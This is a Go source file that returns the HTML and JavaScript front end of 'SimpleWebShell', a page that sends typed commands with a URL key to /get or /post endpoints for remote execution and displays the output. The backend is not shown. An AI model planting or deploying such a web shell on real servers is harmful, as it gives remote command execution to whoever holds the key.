package pages

// 获取WebShell界面HTML
func GetWebShellHTML() string {
	return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SimpleWebShell 1.1.20260225</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #1e1e1e;
            color: #d4d4d4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            color: #569cd6;
            text-align: center;
            margin-bottom: 30px;
        }
        .command-section {
            background-color: #252526;
            border: 1px solid #3e3e42;
            border-radius: 5px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .input-group {
            display: flex;
            margin-bottom: 10px;
        }
        input[type="text"] {
            flex: 1;
            background-color: #3c3c3c;
            border: 1px solid #6c6c6c;
            color: #d4d4d4;
            padding: 8px 12px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        button {
            background-color: #007acc;
            border: none;
            color: white;
            padding: 8px 16px;
            margin-left: 10px;
            border-radius: 3px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        button:hover {
            background-color: #005a9e;
        }
        .output {
            background-color: #0c0c0c;
            border: 1px solid #3e3e42;
            border-radius: 3px;
            padding: 15px;
            min-height: 300px;
            white-space: pre-wrap;
            font-size: 14px;
            overflow-y: auto;
            max-height: 500px;
        }
        .method-select, .format-select {
            background-color: #3c3c3c;
            border: 1px solid #6c6c6c;
            color: #d4d4d4;
            padding: 8px;
            margin-left: 10px;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SimpleWebShell 1.1.20260225 By FasterEdge</h1>
        
        <div class="command-section">
            <div class="input-group">
                <input type="text" id="command" placeholder="输入要执行的命令..." onkeypress="handleKeyPress(event)">
                <select id="method" class="method-select" onchange="toggleFormatSelect()">
                    <option value="POST">POST</option>
                    <option value="GET">GET</option>
                </select>
                <select id="format" class="format-select">
                    <option value="json">JSON</option>
                    <option value="form">Form</option>
                </select>
                <button onclick="executeCommand()">执行</button>
                <button onclick="clearOutput()">清空</button>
            </div>
        </div>
        
        <div class="output" id="output">欢迎使用 SimpleWebShell
请在上方输入框中输入要执行的命令，然后点击执行按钮或按回车键。
支持GET请求和POST请求（JSON/Form格式）。
        </div>
    </div>

    <script>
        function handleKeyPress(event) {
            if (event.key === 'Enter') {
                executeCommand();
            }
        }

        function toggleFormatSelect() {
            const method = document.getElementById('method').value;
            const formatSelect = document.getElementById('format');
            
            if (method === 'GET') {
                formatSelect.style.display = 'none';
            } else {
                formatSelect.style.display = 'inline-block';
            }
        }

        // 页面加载时初始化格式选择框的显示状态
        window.onload = function() {
            toggleFormatSelect();
        }

        function executeCommand() {
            const command = document.getElementById('command').value.trim();
            const method = document.getElementById('method').value;
            const format = document.getElementById('format').value;
            const output = document.getElementById('output');
            
            if (!command) {
                alert('请输入命令');
                return;
            }

            output.textContent += '\n$ ' + command + '\n';
            
            const key = new URLSearchParams(window.location.search).get('key');
            
            if (method === 'GET') {
                fetch('/get?key=' + encodeURIComponent(key) + '&cmd=' + encodeURIComponent(command))
                    .then(response => response.text())
                    .then(data => {
                        output.textContent += data + '\n';
                        output.scrollTop = output.scrollHeight;
                    })
                    .catch(error => {
                        output.textContent += '错误: ' + error + '\n';
                        output.scrollTop = output.scrollHeight;
                    });
            } else {
                let fetchOptions = {
                    method: 'POST'
                };
                
                if (format === 'json') {
                    // JSON格式
                    fetchOptions.headers = {
                        'Content-Type': 'application/json'
                    };
                    fetchOptions.body = JSON.stringify({
                        key: key,
                        cmd: command
                    });
                } else {
                    // 表单格式
                    const formData = new FormData();
                    formData.append('key', key);
                    formData.append('cmd', command);
                    fetchOptions.body = formData;
                }
                
                fetch('/post', fetchOptions)
                    .then(response => response.text())
                    .then(data => {
                        output.textContent += data + '\n';
                        output.scrollTop = output.scrollHeight;
                    })
                    .catch(error => {
                        output.textContent += '错误: ' + error + '\n';
                        output.scrollTop = output.scrollHeight;
                    });
            }
            
            document.getElementById('command').value = '';
        }

        function clearOutput() {
            document.getElementById('output').textContent = '输出已清空。\n';
        }
    </script>
</body>
</html>`
}
